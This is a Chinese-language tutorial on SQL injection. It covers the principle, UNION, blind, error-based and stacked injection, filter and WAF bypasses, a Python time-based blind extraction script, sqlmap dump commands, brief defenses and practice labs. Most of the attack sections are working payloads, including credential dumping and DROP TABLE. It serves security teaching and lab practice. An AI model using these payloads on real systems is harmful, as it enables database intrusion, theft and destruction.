---
title: SQL 注入
description: SQL 注入原理、类型、利用技巧与防御方法。
date: 2026-06-21T00:00:00.000Z
---


## SQL 注入

SQL 注入（SQL Injection）是一种常见的 Web 安全漏洞，攻击者通过在输入中插入恶意 SQL 语句，实现对数据库的非法操作。

### 什么是 SQL 注入？

SQL 注入是指攻击者通过在 Web 应用的输入字段中插入 SQL 代码，欺骗后台数据库执行非预期的 SQL 语句。这种攻击之所以存在，是因为应用程序将用户输入直接拼接到 SQL 查询中，而没有进行充分的验证和过滤。

从安全角度看，SQL 注入的根本原因是"信任边界"的混淆——应用程序错误地信任了用户提供的数据。

### 危害

- **数据泄露**：获取数据库中的敏感信息（用户密码、个人信息等）
- **数据篡改**：修改或删除数据库中的数据
- **权限提升**：获取管理员权限
- **服务器控制**：在某些情况下可以执行系统命令

### 真实案例

2011年，索尼 PlayStation Network 遭受 SQL 注入攻击，导致 7700 万用户数据泄露。这个案例说明即使是大型公司也可能受到 SQL 注入的影响。

---

### 一、注入原理

当应用程序将用户输入直接拼接到 SQL 语句中，且未进行充分的过滤和转义时，攻击者可以通过构造特殊的输入来改变 SQL 语句的逻辑。

例如，一个简单的登录验证：

```sql
SELECT * FROM users WHERE username='输入' AND password='输入'
```

如果用户输入 `admin' --`，则 SQL 语句变为：

```sql
SELECT * FROM users WHERE username='admin' --' AND password=''
```

`--` 后面的内容被注释掉，攻击者无需密码即可登录。

---

### 二、注入类型

#### 1. 联合查询注入（UNION Based）

当页面直接显示 SQL 查询结果时，可以使用 `UNION SELECT` 获取其他表的数据。

**前提条件：**
- 页面有回显位置
- 知道查询的列数
- 列的数据类型兼容

**注入步骤：**

```sql
-- 1. 判断列数
ORDER BY 1-- 
ORDER BY 2-- 
...
ORDER BY n--+  -- 报错时 n-1 就是列数

-- 2. 判断回显位置
UNION SELECT 1,2,3--+

-- 3. 获取数据库名
UNION SELECT 1,database(),3--+

-- 4. 获取表名
UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+

-- 5. 获取列名
UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--+

-- 6. 获取数据
UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--+
```

#### 2. 布尔盲注（Boolean Based）

页面不显示查询结果，但会根据查询的真假返回不同的页面。

```sql
-- 判断数据库名长度
AND length(database())>5--+

-- 逐字符判断数据库名
AND ascii(substr(database(),1,1))>100--+
AND ascii(substr(database(),2,1))>100--+

-- 判断表名
AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100--+
```

#### 3. 时间盲注（Time Based）

页面对真假条件返回相同的页面，只能通过响应时间差异判断。

```sql
-- 判断数据库名长度
AND IF(length(database())>5,sleep(3),0)--+

-- 逐字符判断
AND IF(ascii(substr(database(),1,1))>100,sleep(3),0)--+
```

**自动化脚本：**

```python
import requests

url = "http://target.com/vuln?id=1"
result = ""

for i in range(1, 50):
    for j in range(32, 127):
        payload = f"AND IF(ascii(substr(database(),{i},1))={j},sleep(1),0)--"
        r = requests.get(url, params={"id": f"1 {payload}"}, timeout=5)
        if r.elapsed.total_seconds() > 1:
            result += chr(j)
            print(result)
            break
```

#### 4. 报错注入（Error Based）

利用数据库报错信息获取数据。

```sql
-- extractvalue（MySQL 5.1+）
AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+

-- updatexml（MySQL 5.1+）
AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+

-- floor（通用）
AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
```

#### 5. 堆叠注入（Stacked Queries）

数据库支持执行多条 SQL 语句时，可以用分号 `;` 分隔执行多条语句。

```sql
1; DROP TABLE users--+
1; INSERT INTO users VALUES('hacker','123456')--+
```

---

### 三、注入点类型

#### GET 参数注入

```
http://target.com/page?id=1 UNION SELECT 1,2,3--+
```

#### POST 参数注入

通过 POST 请求的表单数据进行注入。

#### HTTP 头注入

```sql
-- User-Agent 注入
' UNION SELECT 1,user_agent,3--+

-- Referer 注入
' UNION SELECT 1,referer,3--+

-- Cookie 注入
' UNION SELECT 1,cookie_value,3--+
```

---

### 四、绕过技巧

#### 空格绕过

```sql
/**/    -- MySQL
%20     -- URL 编码
%0a     -- 换行符
%09     -- Tab
%0b     -- 垂直 Tab
()      -- 括号
```

#### 关键字绕过

```sql
-- 大小写
SeLeCt

-- 双写
seselectlect

-- 内联注释
/*!UNION*/ /*!SELECT*/
```

#### 引号绕过

```sql
-- 16进制编码
WHERE table_name=0x7573657273

-- ASCII 编码
WHERE table_name=char(117,115,101,114,115)
```

#### 逗号绕过

```sql
-- JOIN
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

-- MID
MID(database() FROM 1 FOR 1)

-- LIMIT
LIMIT 0 OFFSET 1
```

---

### 五、sqlmap 自动化

```bash
# 基本用法
sqlmap -u "http://target.com/page?id=1"

# POST 注入
sqlmap -u "http://target.com/login" --data="user=admin&pass=123"

# 指定数据库
sqlmap -u "http://target.com/page?id=1" -D dbname

# 获取所有表
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# 获取列
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns

# 获取数据
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# 使用 cookie
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# 绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between
```

---

### 六、防御方法

1. **参数化查询（Prepared Statements）**
2. **存储过程**
3. **输入验证与过滤**
4. **最小权限原则**
5. **WAF（Web Application Firewall）**

---

### 七、练习平台

- [SQLi-labs](https://github.com/Audi-1/sqli-labs)
- [BUUCTF Web 方向](https://buuoj.cn/)
- [Pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)
